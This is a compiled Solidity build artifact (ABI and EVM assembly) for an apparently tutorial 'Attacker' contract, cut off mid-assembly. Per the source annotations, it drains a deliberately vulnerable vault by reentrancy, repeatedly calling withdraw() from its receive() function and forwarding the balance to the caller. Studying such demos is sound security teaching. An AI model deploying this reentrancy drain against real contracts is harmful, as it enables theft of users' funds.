{
	"contracts/2.5-合约收款、转账与安全问题/VulnerableVault.sol": {
		"Attacker": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_target",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [],
					"name": "attack",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "target",
					"outputs": [
						{
							"internalType": "contract VulnerableVault",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"contracts/2.5-\\xe5\\x90\\x88\\xe7\\xba\\xa6\\xe6\\x94\\xb6\\xe6\\xac\\xbe\\xe3\\x80\\x81\\xe8\\xbd\\xac\\xe8\\xb4\\xa6\\xe4\\xb8\\x8e\\xe5\\xae\\x89\\xe5\\x85\\xa8\\xe9\\x97\\xae\\xe9\\xa2\\x98/VulnerableVault.sol\":679:1244  contract Attacker {... */\n  mstore(0x40, 0x80)\n    /* \"contracts/2.5-\\xe5\\x90\\x88\\xe7\\xba\\xa6\\xe6\\x94\\xb6\\xe6\\xac\\xbe\\xe3\\x80\\x81\\xe8\\xbd\\xac\\xe8\\xb4\\xa6\\xe4\\xb8\\x8e\\xe5\\xae\\x89\\xe5\\x85\\xa8\\xe9\\x97\\xae\\xe9\\xa2\\x98/VulnerableVault.sol\":739:818  constructor(address _target) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  revert(0x00, 0x00)\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"contracts/2.5-\\xe5\\x90\\x88\\xe7\\xba\\xa6\\xe6\\x94\\xb6\\xe6\\xac\\xbe\\xe3\\x80\\x81\\xe8\\xbd\\xac\\xe8\\xb4\\xa6\\xe4\\xb8\\x8e\\xe5\\xae\\x89\\xe5\\x85\\xa8\\xe9\\x97\\xae\\xe9\\xa2\\x98/VulnerableVault.sol\":803:810  _target */\n  dup1\n    /* \"contracts/2.5-\\xe5\\x90\\x88\\xe7\\xba\\xa6\\xe6\\x94\\xb6\\xe6\\xac\\xbe\\xe3\\x80\\x81\\xe8\\xbd\\xac\\xe8\\xb4\\xa6\\xe4\\xb8\\x8e\\xe5\\xae\\x89\\xe5\\x85\\xa8\\xe9\\x97\\xae\\xe9\\xa2\\x98/VulnerableVault.sol\":778:784  target */\n  0x00\n  0x00\n    /* \"contracts/2.5-\\xe5\\x90\\x88\\xe7\\xba\\xa6\\xe6\\x94\\xb6\\xe6\\xac\\xbe\\xe3\\x80\\x81\\xe8\\xbd\\xac\\xe8\\xb4\\xa6\\xe4\\xb8\\x8e\\xe5\\xae\\x89\\xe5\\x85\\xa8\\xe9\\x97\\xae\\xe9\\xa2\\x98/VulnerableVault.sol\":778:811  target = VulnerableVault(_target) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/2.5-\\xe5\\x90\\x88\\xe7\\xba\\xa6\\xe6\\x94\\xb6\\xe6\\xac\\xbe\\xe3\\x80\\x81\\xe8\\xbd\\xac\\xe8\\xb4\\xa6\\xe4\\xb8\\x8e\\xe5\\xae\\x89\\xe5\\x85\\xa8\\xe9\\x97\\xae\\xe9\\xa2\\x98/VulnerableVault.sol\":739:818  constructor(address _target) {... */\n  pop\n    /* \"contracts/2.5-\\xe5\\x90\\x88\\xe7\\xba\\xa6\\xe6\\x94\\xb6\\xe6\\xac\\xbe\\xe3\\x80\\x81\\xe8\\xbd\\xac\\xe8\\xb4\\xa6\\xe4\\xb8\\x8e\\xe5\\xae\\x89\\xe5\\x85\\xa8\\xe9\\x97\\xae\\xe9\\xa2\\x98/VulnerableVault.sol\":679:1244  contract Attacker {... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  0x00\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_20\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_20:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:690   */\ntag_12:\n    /* \"#utility.yul\":641:665   */\n  tag_22\n    /* \"#utility.yul\":659:664   */\n  dup2\n    /* \"#utility.yul\":641:665   */\n  tag_11\n  jump\t// in\ntag_22:\n    /* \"#utility.yul\":634:639   */\n  dup2\n    /* \"#utility.yul\":631:666   */\n  eq\n    /* \"#utility.yul\":621:684   */\n  tag_23\n  jumpi\n    /* \"#utility.yul\":680:681   */\n  0x00\n    /* \"#utility.yul\":677:678   */\n  0x00\n    /* \"#utility.yul\":670:682   */\n  revert\n    /* \"#utility.yul\":621:684   */\ntag_23:\n    /* \"#utility.yul\":568:690   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:839   */\ntag_13:\n    /* \"#utility.yul\":753:758   */\n  0x00\n    /* \"#utility.yul\":784:790   */\n  dup2\n    /* \"#utility.yul\":778:791   */\n  mload\n    /* \"#utility.yul\":769:791   */\n  swap1\n  pop\n    /* \"#utility.yul\":800:833   */\n  tag_25\n    /* \"#utility.yul\":827:832   */\n  dup2\n    /* \"#utility.yul\":800:833   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":696:839   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":845:1196   */\ntag_3:\n    /* \"#utility.yul\":915:921   */\n  0x00\n    /* \"#utility.yul\":964:966   */\n  0x20\n    /* \"#utility.yul\":952:961   */\n  dup3\n    /* \"#utility.yul\":943:950   */\n  dup5\n    /* \"#utility.yul\":939:962   */\n  sub\n    /* \"#utility.yul\":935:967   */\n  slt\n    /* \"#utility.yul\":932:1051   */\n  iszero\n  tag_27\n  jumpi\n    /* \"#utility.yul\":970:1049   */\n  tag_28\n  tag_8\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":932:1051   */\ntag_27:\n    /* \"#utility.yul\":1090:1091   */\n  0x00\n    /* \"#utility.yul\":1115:1179   */\n  tag_29\n    /* \"#utility.yul\":1171:1178   */\n  dup5\n    /* \"#utility.yul\":1162:1168   */\n  dup3\n    /* \"#utility.yul\":1151:1160   */\n  dup6\n    /* \"#utility.yul\":1147:1169   */\n  add\n    /* \"#utility.yul\":1115:1179   */\n  tag_13\n  jump\t// in\ntag_29:\n    /* \"#utility.yul\":1105:1179   */\n  swap2\n  pop\n    /* \"#utility.yul\":1061:1189   */\n  pop\n    /* \"#utility.yul\":845:1196   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"contracts/2.5-\\xe5\\x90\\x88\\xe7\\xba\\xa6\\xe6\\x94\\xb6\\xe6\\xac\\xbe\\xe3\\x80\\x81\\xe8\\xbd\\xac\\xe8\\xb4\\xa6\\xe4\\xb8\\x8e\\xe5\\xae\\x89\\xe5\\x85\\xa8\\xe9\\x97\\xae\\xe9\\xa2\\x98/VulnerableVault.sol\":679:1244  contract Attacker {... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/2.5-\\xe5\\x90\\x88\\xe7\\xba\\xa6\\xe6\\x94\\xb6\\xe6\\xac\\xbe\\xe3\\x80\\x81\\xe8\\xbd\\xac\\xe8\\xb4\\xa6\\xe4\\xb8\\x8e\\xe5\\xae\\x89\\xe5\\x85\\xa8\\xe9\\x97\\xae\\xe9\\xa2\\x98/VulnerableVault.sol\":679:1244  contract Attacker {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x9e5faafc\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xd4b83992\n      eq\n      tag_4\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n        /* \"contracts/2.5-\\xe5\\x90\\x88\\xe7\\xba\\xa6\\xe6\\x94\\xb6\\xe6\\xac\\xbe\\xe3\\x80\\x81\\xe8\\xbd\\xac\\xe8\\xb4\\xa6\\xe4\\xb8\\x8e\\xe5\\xae\\x89\\xe5\\x85\\xa8\\xe9\\x97\\xae\\xe9\\xa2\\x98/VulnerableVault.sol\":891:898  1 ether */\n      0x0de0b6b3a7640000\n        /* \"contracts/2.5-\\xe5\\x90\\x88\\xe7\\xba\\xa6\\xe6\\x94\\xb6\\xe6\\xac\\xbe\\xe3\\x80\\x81\\xe8\\xbd\\xac\\xe8\\xb4\\xa6\\xe4\\xb8\\x8e\\xe5\\xae\\x89\\xe5\\x85\\xa8\\xe9\\x97\\xae\\xe9\\xa2\\x98/VulnerableVault.sol\":873:879  target */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/2.5-\\xe5\\x90\\x88\\xe7\\xba\\xa6\\xe6\\x94\\xb6\\xe6\\xac\\xbe\\xe3\\x80\\x81\\xe8\\xbd\\xac\\xe8\\xb4\\xa6\\xe4\\xb8\\x8e\\xe5\\xae\\x89\\xe5\\x85\\xa8\\xe9\\x97\\xae\\xe9\\xa2\\x98/VulnerableVault.sol\":865:888  address(target).balance */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      balance\n        /* \"contracts/2.5-\\xe5\\x90\\x88\\xe7\\xba\\xa6\\xe6\\x94\\xb6\\xe6\\xac\\xbe\\xe3\\x80\\x81\\xe8\\xbd\\xac\\xe8\\xb4\\xa6\\xe4\\xb8\\x8e\\xe5\\xae\\x89\\xe5\\x85\\xa8\\xe9\\x97\\xae\\xe9\\xa2\\x98/VulnerableVault.sol\":865:898  address(target).balance > 1 ether */\n      gt\n        /* \"contracts/2.5-\\xe5\\x90\\x88\\xe7\\xba\\xa6\\xe6\\x94\\xb6\\xe6\\xac\\xbe\\xe3\\x80\\x81\\xe8\\xbd\\xac\\xe8\\xb4\\xa6\\xe4\\xb8\\x8e\\xe5\\xae\\x89\\xe5\\x85\\xa8\\xe9\\x97\\xae\\xe9\\xa2\\x98/VulnerableVault.sol\":861:942  if (address(target).balance > 1 ether) {... */\n      iszero\n      tag_7\n      jumpi\n        /* \"contracts/2.5-\\xe5\\x90\\x88\\xe7\\xba\\xa6\\xe6\\x94\\xb6\\xe6\\xac\\xbe\\xe3\\x80\\x81\\xe8\\xbd\\xac\\xe8\\xb4\\xa6\\xe4\\xb8\\x8e\\xe5\\xae\\x89\\xe5\\x85\\xa8\\xe9\\x97\\xae\\xe9\\xa2\\x98/VulnerableVault.sol\":914:920  target */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/2.5-\\xe5\\x90\\x88\\xe7\\xba\\xa6\\xe6\\x94\\xb6\\xe6\\xac\\xbe\\xe3\\x80\\x81\\xe8\\xbd\\xac\\xe8\\xb4\\xa6\\xe4\\xb8\\x8e\\xe5\\xae\\x89\\xe5\\x85\\xa8\\xe9\\x97\\xae\\xe9\\xa2\\x98/VulnerableVault.sol\":914:929  target.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x3ccfd60b\n        /* \"contracts/2.5-\\xe5\\x90\\x88\\xe7\\xba\\xa6\\xe6\\x94\\xb6\\xe6\\xac\\xbe\\xe3\\x80\\x81\\xe8\\xbd\\xac\\xe8\\xb4\\xa6\\xe4\\xb8\\x8e\\xe5\\xae\\x89\\xe5\\x85\\xa8\\xe9\\x97\\xae\\xe9\\xa2\\x98/VulnerableVault.sol\":914:931  target.withdraw() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_8\n      jumpi\n      revert(0x00, 0x00)\n    tag_8:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_10\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_10:\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/2.5-\\xe5\\x90\\x88\\xe7\\xba\\xa6\\xe6\\x94\\xb6\\xe6\\xac\\xbe\\xe3\\x80\\x81\\xe8\\xbd\\xac\\xe8\\xb4\\xa6\\xe4\\xb8\\x8e\\xe5\\xae\\x89\\xe5\\x85\\xa8\\xe9\\x97\\xae\\xe9\\xa2\\x98/VulnerableVault.sol\":861:942  if (address(target).balance > 1 ether) {... */\n    tag_7:\n        /* \"contracts/2.5-\\xe5\\x90\\x88\\xe7\\xba\\xa6\\xe6\\x94\\xb6\\xe6\\xac\\xbe\\xe3\\x80\\x81\\xe8\\xbd\\xac\\xe8\\xb4\\xa6\\xe4\\xb8\\x8e\\xe5\\xae\\x89\\xe5\\x85\\xa8\\xe9\\x97\\xae\\xe9\\xa2\\x98/VulnerableVault.sol\":679:1244  contract Attacker {... */\n      stop\n    tag_2:\n      revert(0x00, 0x00)\n        /* \"contracts/2.5-\\xe5\\x90\\x88\\xe7\\xba\\xa6\\xe6\\x94\\xb6\\xe6\\xac\\xbe\\xe3\\x80\\x81\\xe8\\xbd\\xac\\xe8\\xb4\\xa6\\xe4\\xb8\\x8e\\xe5\\xae\\x89\\xe5\\x85\\xa8\\xe9\\x97\\xae\\xe9\\xa2\\x98/VulnerableVault.sol\":954:1242  function attack() external payable {... */\n    tag_3:\n      tag_11\n      tag_12\n      jump\t// in\n    tag_11:\n      stop\n        /* \"contracts/2.5-\\xe5\\x90\\x88\\xe7\\xba\\xa6\\xe6\\x94\\xb6\\xe6\\xac\\xbe\\xe3\\x80\\x81\\xe8\\xbd\\xac\\xe8\\xb4\\xa6\\xe4\\xb8\\x8e\\xe5\\xae\\x89\\xe5\\x85\\xa8\\xe9\\x97\\xae\\xe9\\xa2\\x98/VulnerableVault.sol\":703:732  VulnerableVault public target */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_13\n      jumpi\n      revert(0x00, 0x00)\n    tag_13:\n      pop\n      tag_14\n      tag_15\n      jump\t// in\n    tag_14:\n      mload(0x40)\n      tag_16\n      swap2\n      swap1\n      tag_17\n      jump\t// in\n    tag_16:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/2.5-\\xe5\\x90\\x88\\xe7\\xba\\xa6\\xe6\\x94\\xb6\\xe6\\xac\\xbe\\xe3\\x80\\x81\\xe8\\xbd\\xac\\xe8\\xb4\\xa6\\xe4\\xb8\\x8e\\xe5\\xae\\x89\\xe5\\x85\\xa8\\xe9\\x97\\xae\\xe9\\xa2\\x98/VulnerableVault.sol\":954:1242  function attack() external payable {... */\n    tag_12:\n        /* \"contracts/2.5-\\xe5\\x90\\x88\\xe7\\xba\\xa6\\xe6\\x94\\xb6\\xe6\\xac\\xbe\\xe3\\x80\\x81\\xe8\\xbd\\xac\\xe8\\xb4\\xa6\\xe4\\xb8\\x8e\\xe5\\xae\\x89\\xe5\\x85\\xa8\\xe9\\x97\\xae\\xe9\\xa2\\x98/VulnerableVault.sol\":1020:1027  1 ether */\n      0x0de0b6b3a7640000\n        /* \"contracts/2.5-\\xe5\\x90\\x88\\xe7\\xba\\xa6\\xe6\\x94\\xb6\\xe6\\xac\\xbe\\xe3\\x80\\x81\\xe8\\xbd\\xac\\xe8\\xb4\\xa6\\xe4\\xb8\\x8e\\xe5\\xae\\x89\\xe5\\x85\\xa8\\xe9\\x97\\xae\\xe9\\xa2\\x98/VulnerableVault.sol\":1007:1016  msg.value */\n      callvalue\n        /* \"contracts/2.5-\\xe5\\x90\\x88\\xe7\\xba\\xa6\\xe6\\x94\\xb6\\xe6\\xac\\xbe\\xe3\\x80\\x81\\xe8\\xbd\\xac\\xe8\\xb4\\xa6\\xe4\\xb8\\x8e\\xe5\\xae\\x89\\xe5\\x85\\xa8\\xe9\\x97\\xae\\xe9\\xa2\\x98/VulnerableVault.sol\":1007:1027  msg.value >= 1 ether */\n      lt\n      iszero\n        /* \"contracts/2.5-\\xe5\\x90\\x88\\xe7\\xba\\xa6\\xe6\\x94\\xb6\\xe6\\xac\\xbe\\xe3\\x80\\x81\\xe8\\xbd\\xac\\xe8\\xb4\\xa6\\xe4\\xb8\\x8e\\xe5\\xae\\x89\\xe5\\x85\\xa8\\xe9\\x97\\xae\\xe9\\xa2\\x98/VulnerableVault.sol\":999:1042  require(msg.value >= 1 ether, \"need 1 ETH\") */\n      tag_19\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_20\n      swap1\n      tag_21\n      jump\t// in\n    tag_20:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_19:\n        /* \"contracts/2.5-\\xe5\\x90\\x88\\xe7\\xba\\xa6\\xe6\\x94\\xb6\\xe6\\xac\\xbe\\xe3\\x80\\x81\\xe8\\xbd\\xac\\xe8\\xb4\\xa6\\xe4\\xb8\\x8e\\xe5\\xae\\x89\\xe5\\x85\\xa8\\xe9\\x97\\xae\\xe9\\xa2\\x98/VulnerableVault.sol\":1052:1058  target */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/2.5-\\xe5\\x90\\x88\\xe7\\xba\\xa6\\xe6\\x94\\xb6\\xe6\\xac\\xbe\\xe3\\x80\\x81\\xe8\\xbd\\xac\\xe8\\xb4\\xa6\\xe4\\xb8\\x8e\\xe5\\xae\\x89\\xe5\\x85\\xa8\\xe9\\x97\\xae\\xe9\\xa2\\x98/VulnerableVault.sol\":1052:1066  target.deposit */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xd0e30db0\n        /* \"contracts/2.5-\\xe5\\x90\\x88\\xe7\\xba\\xa6\\xe6\\x94\\xb6\\xe6\\xac\\xbe\\xe3\\x80\\x81\\xe8\\xbd\\xac\\xe8\\xb4\\xa6\\xe4\\xb8\\x8e\\xe5\\xae\\x89\\xe5\\x85\\xa8\\xe9\\x97\\xae\\xe9\\xa2\\x98/VulnerableVault.sol\":1074:1081  1 ether */\n      0x0de0b6b3a7640000\n        /* \"contracts/2.5-\\xe5\\x90\\x88\\xe7\\xba\\xa6\\xe6\\x94\\xb6\\xe6\\xac\\xbe\\xe3\\x80\\x81\\xe8\\xbd\\xac\\xe8\\xb4\\xa6\\xe4\\xb8\\x8e\\xe5\\xae\\x89\\xe5\\x85\\xa8\\xe9\\x97\\xae\\xe9\\xa2\\x98/VulnerableVault.sol\":1052:1084  target.deposit{value: 1 ether}() */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_22\n      jumpi\n      revert(0x00, 0x00)\n    tag_22:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_24\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_24:\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/2.5-\\xe5\\x90\\x88\\xe7\\xba\\xa6\\xe6\\x94\\xb6\\xe6\\xac\\xbe\\xe3\\x80\\x81\\xe8\\xbd\\xac\\xe8\\xb4\\xa6\\xe4\\xb8\\x8e\\xe5\\xae\\x89\\xe5\\x85\\xa8\\xe9\\x97\\xae\\xe9\\xa2\\x98/VulnerableVault.sol\":1094:1100  target */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/2.5-\\xe5\\x90\\x88\\xe7\\xba\\xa6\\xe6\\x94\\xb6\\xe6\\xac\\xbe\\xe3\\x80\\x81\\xe8\\xbd\\xac\\xe8\\xb4\\xa6\\xe4\\xb8\\x8e\\xe5\\xae\\x89\\xe5\\x85\\xa8\\xe9\\x97\\xae\\xe9\\xa2\\x98/VulnerableVault.sol\":1094:1109  target.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x3ccfd60b\n        /* \"contracts/2.5-\\xe5\\x90\\x88\\xe7\\xba\\xa6\\xe6\\x94\\xb6\\xe6\\xac\\xbe\\xe3\\x80\\x81\\xe8\\xbd\\xac\\xe8\\xb4\\xa6\\xe4\\xb8\\x8e\\xe5\\xae\\x89\\xe5\\x85\\xa8\\xe9\\x97\\xae\\xe9\\xa2\\x98/VulnerableVault.sol\":1094:1111  target.withdraw() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_25\n      jumpi\n      revert(0x00, 0x00)\n    tag_25:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_27\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_27:\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/2.5-\\xe5\\x90\\x88\\xe7\\xba\\xa6\\xe6\\x94\\xb6\\xe6\\xac\\xbe\\xe3\\x80\\x81\\xe8\\xbd\\xac\\xe8\\xb4\\xa6\\xe4\\xb8\\x8e\\xe5\\xae\\x89\\xe5\\x85\\xa8\\xe9\\x97\\xae\\xe9\\xa2\\x98/VulnerableVault.sol\":1192:1202  msg.sender */\n      caller\n        /* \"contracts/2.5-\\xe5\\x90\\x88\\xe7\\xba\\xa6\\xe6\\x94\\xb6\\xe6\\xac\\xbe\\xe3\\x80\\x81\\xe8\\xbd\\xac\\xe8\\xb4\\xa6\\xe4\\xb8\\x8e\\xe5\\xae\\x89\\xe5\\x85\\xa8\\xe9\\x97\\xae\\xe9\\xa2\\x98/VulnerableVault.sol\":1184:1212  payable(msg.sender).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/2.5-\\xe5\\x90\\x88\\xe7\\xba\\xa6\\xe6\\x94\\xb6\\xe6\\xac\\xbe\\xe3\\x80\\x81\\xe8\\xbd\\xac\\xe8\\xb4\\xa6\\xe4\\xb8\\x8e\\xe5\\xae\\x89\\xe5\\x85\\xa8\\xe9\\x97\\xae\\xe9\\xa2\\x98/VulnerableVault.sol\":1184:1235  payable(msg.sender).transfer(address(this).balance) */\n      0x08fc\n        /* \"contracts/2.5-\\xe5\\x90\\x88\\xe7\\xba\\xa6\\xe6\\x94\\xb6\\xe6\\xac\\xbe\\xe3\\x80\\x81\\xe8\\xbd\\xac\\xe8\\xb4\\xa6\\xe4\\xb8\\x8e\\xe5\\xae\\x89\\xe5\\x85\\xa8\\xe9\\x97\\xae\\xe9\\xa2\\x98/VulnerableVault.sol\":1213:1234  address(this).balance */\n      selfbalance\n        /* \"contracts/2.5-\\xe5\\x90\\x88\\xe7\\xba\\xa6\\xe6\\x94\\xb6\\xe6\\xac\\xbe\\xe3\\x80\\x81\\xe8\\xbd\\xac\\xe8\\xb4\\xa6\\xe4\\xb8\\x8e\\xe5\\xae\\x89\\xe5\\x85\\xa8\\xe9\\x97\\xae\\xe9\\xa2\\x98/VulnerableVault.sol\":1184:1235  payable(msg.sender).transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_29\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_29:\n      pop\n        /* \"contracts/2.5-\\xe5\\x90\\x88\\xe7\\xba\\xa6\\xe6\\x94\\xb6\\xe6\\xac\\xbe\\xe3\\x80\\x81\\xe8\\xbd\\xac\\xe8\\xb4\\xa6\\xe4\\xb8\\x8e\\xe5\\xae\\x89\\xe5\\x85\\xa8\\xe9\\x97\\xae\\xe9\\xa2\\x98/VulnerableVault.sol\":954:1242  function attack() external payable {... */\n      jump\t// out\n        /* \"contracts/2.5-\\xe5\\x90\\x88\\xe7\\xba\\xa6\\xe6\\x94\\xb6\\xe6\\xac\\xbe\\xe3\\x80\\x81\\xe8\\xbd\\xac\\xe8\\xb4\\xa6\\xe4\\xb8\\x8e\\xe5\\xae\\x89\\xe5\\x85\\xa8\\xe9\\x97\\xae\\xe9\\xa2\\x98/VulnerableVault.sol\":703:732  VulnerableVault public target */\n    tag_15:\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"#utility.yul\":7:133   */\n    tag_30:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":84:126   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":77:82   */\n      dup3\n        /* \"#utility.yul\":73:127   */\n      and\n        /* \"#utility.yul\":62:127   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:133   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":139:199   */\n    tag_31:\n        /* \"#utility.yul\":167:170   */\n      0x00\n        /* \"#utility.yul\":188:193   */\n      dup2\n        /* \"#utility.yul\":181:193   */\n      swap1\n      pop\n        /* \"#utility.yul\":139:199   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":205:347   */\n    tag_32:\n        /* \"#utility.yul\":255:264   */\n      0x00\n        /* \"#utility.yul\":288:341   */\n      tag_43\n        /* \"#utility.yul\":306:340   */\n      tag_44\n        /* \"#utility.yul\":315:339   */\n      tag_45\n        /* \"#utility.yul\":333:338   */\n      dup5\n        /* \"#utility.yul\":315:339   */\n      tag_30\n      jump\t// in\n    tag_45:\n        /* \"#utility.yul\":306:340   */\n      tag_31\n      jump\t// in\n    tag_44:\n        /* \"#utility.yul\":288:341   */\n      tag_30\n      jump\t// in\n    tag_43:\n        /* \"#utility.yul\":275:341   */\n      swap1\n      pop\n        /* \"#utility.yul\":205:347   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":353:479   */\n    tag_33:\n        /* \"#utility.yul\":403:412   */\n      0x00\n        /* \"#utility.yul\":436:473   */\n      tag_47\n        /* \"#utility.yul\":467:472   */\n      dup3\n        /* \"#utility.yul\":436:473   */\n      tag_32\n      jump\t// in\n    tag_47:\n        /* \"#utility.yul\":423:473   */\n      swap1\n      pop\n        /* \"#utility.yul\":353:479   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":485:633   */\n    tag_34:\n        /* \"#utility.yul\":557:566   */\n      0x00\n        /* \"#utility.yul\":590:627   */\n      tag_49\n        /* \"#utility.yul\":621:626   */\n      dup3\n        /* \"#utility.yul\":590:627   */\n      tag_33\n      jump\t// in\n    tag_49:\n        /* \"#utility.yul\":577:627   */\n      swap1\n      pop\n        /* \"#utility.yul\":485:633   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":639:814   */\n    tag_35:\n        /* \"#utility.yul\":748:807   */\n      tag_51\n        /* \"#utility.yul\":801:806   */\n      dup2\n        /* \"#utility.yul\":748:807   */\n      tag_34\n      jump\t// in\n    tag_51:\n        /* \"#utility.yul\":743:746   */\n      dup3\n        /* \"#utility.yul\":736:808   */\n      mstore\n        /* \"#utility.yul\":639:814   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":820:1086   */\n    tag_17:\n        /* \"#utility.yul\":935:939   */\n      0x00\n        /* \"#utility.yul\":973:975   */\n      0x20\n        /* \"#utility.yul\":962:971   */\n      dup3\n        /* \"#utility.yul\":958:976   */\n      add\n        /* \"#utility.yul\":950:976   */\n      